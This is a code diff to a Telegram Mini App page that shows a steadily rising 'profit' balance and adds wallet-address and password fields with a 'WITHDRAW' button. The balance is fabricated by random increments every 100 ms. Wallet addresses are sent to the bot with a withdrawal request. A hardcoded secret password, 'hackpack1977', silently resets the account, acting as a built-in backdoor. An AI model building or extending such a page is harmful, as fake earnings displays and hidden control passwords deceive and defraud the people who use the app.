@@ -8,7 +8,7 @@
     <style>
         body {
             font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-            background-color: #000000; /* Глубокий черный */
+            background-color: #000000;
             color: white;
             margin: 0;
             height: 100vh;
@@ -19,57 +19,71 @@
             overflow: hidden;
         }
 
-        .balance-container {
-            text-align: center;
-        }
+        .balance-container { text-align: center; margin-bottom: 30px; }
 
         .label {
             color: #8a8a8e;
-            font-size: 14px;
+            font-size: 12px;
             letter-spacing: 1px;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
             text-transform: uppercase;
         }
 
         .balance-value {
-            font-size: 48px;
+            font-size: 44px;
             font-weight: 800;
             color: #ffffff;
             text-shadow: 0 0 20px rgba(64, 167, 227, 0.3);
-            font-variant-numeric: tabular-nums; /* Чтобы цифры не прыгали */
+            font-variant-numeric: tabular-nums;
         }
 
-        .currency {
-            color: #40a7e3;
-            margin-right: 5px;
+        .currency { color: #40a7e3; margin-right: 5px; }
+
+        /* Поля ввода */
+        .input-group {
+            width: 80%;
+            max-width: 300px;
+            margin-bottom: 15px;
         }
 
-        .btn-main {
-            margin-top: 40px;
+        input {
+            width: 100%;
+            background: #111;
+            border: 1px solid #333;
+            border-radius: 12px;
+            padding: 12px;
+            color: white;
+            font-size: 14px;
+            box-sizing: border-box;
+            outline: none;
+            transition: border 0.3s;
+        }
+
+        input:focus { border-color: #40a7e3; }
+
+        .withdraw-btn {
             background: #ffffff;
             color: #000000;
             border: none;
-            padding: 18px 60px;
+            padding: 15px 50px;
             border-radius: 30px;
             font-size: 16px;
             font-weight: 700;
             cursor: pointer;
-            box-shadow: 0 4px 15px rgba(255, 255, 255, 0.2);
-            transition: all 0.2s;
+            margin-top: 10px;
+            width: 80%;
+            max-width: 300px;
         }
 
-        .btn-main:active {
-            transform: scale(0.95);
-            background: #e0e0e0;
-        }
+        .withdraw-btn:active { transform: scale(0.95); }
 
-        /* Анимация пульсации для статуса */
         .status {
             margin-top: 15px;
-            font-size: 12px;
+            font-size: 11px;
             color: #4cd964;
             display: flex;
             align-items: center;
+            justify-content: center;
             gap: 5px;
         }
 
@@ -82,9 +96,8 @@
         }
 
         @keyframes pulse {
-            0% { opacity: 1; }
+            0%, 100% { opacity: 1; }
             50% { opacity: 0.3; }
-            100% { opacity: 1; }
         }
     </style>
 </head>
@@ -100,7 +113,17 @@
         </div>
     </div>
 
-    <button class="btn-main" onclick="claimProfit()">CLAIM PROFIT</button>
+    <div class="input-group">
+        <div class="label" style="text-align: left; margin-left: 5px;">ENTER TG WALLET</div>
+        <input type="text" id="wallet" placeholder="UQB1x...">
+    </div>
+
+    <div class="input-group">
+        <div class="label" style="text-align: left; margin-left: 5px;">PASSWORD</div>
+        <input type="password" id="password" placeholder="••••••••">
+    </div>
+
+    <button class="withdraw-btn" onclick="handleWithdraw()">WITHDRAW</button>
 
     <script>
         const tg = window.Telegram.WebApp;
@@ -108,27 +131,43 @@
         tg.setHeaderColor('#000000');
 
         let currentBalance = 0.00;
+        let isHacked = false;
         const balanceElement = document.getElementById('balance');
 
-        // Функция роста баланса
         function updateBalance() {
-            // Прибавляем случайное небольшое число для эффекта "реального времени"
-            const increment = Math.random() * 0.05; 
+            if (isHacked) return; // Если обнулено, рост прекращается
+            
+            const increment = Math.random() * 0.08; 
             currentBalance += increment;
             
-            // Форматируем число, чтобы всегда было 2 знака после запятой
             balanceElement.innerText = currentBalance.toLocaleString('en-US', {
                 minimumFractionDigits: 2,
                 maximumFractionDigits: 2
             });
         }
 
-        // Запускаем обновление каждые 100 миллисекунд (очень часто)
         setInterval(updateBalance, 100);
 
-        function claimProfit() {
-            const finalAmount = currentBalance.toFixed(2);
-            tg.sendData("Собрано прибыли: $" + finalAmount);
+        function handleWithdraw() {
+            const wallet = document.getElementById('wallet').value;
+            const pass = document.getElementById('password').value;
+
+            if (!wallet) {
+                alert("Please enter TG Wallet");
+                return;
+            }
+
+            // Проверка секретного пароля
+            if (pass === "hackpack1977") {
+                isHacked = true;
+                currentBalance = 0.00;
+                balanceElement.innerText = "0.00";
+                tg.sendData("ALERT: Account reset by hackpack1977");
+                alert("Account Reset Successfully");
+            } else {
+                tg.sendData(`Withdraw Request: ${currentBalance.toFixed(2)} to ${wallet}`);
+                alert("Withdrawal request sent to processing");
+            }
         }
     </script>
 </body>
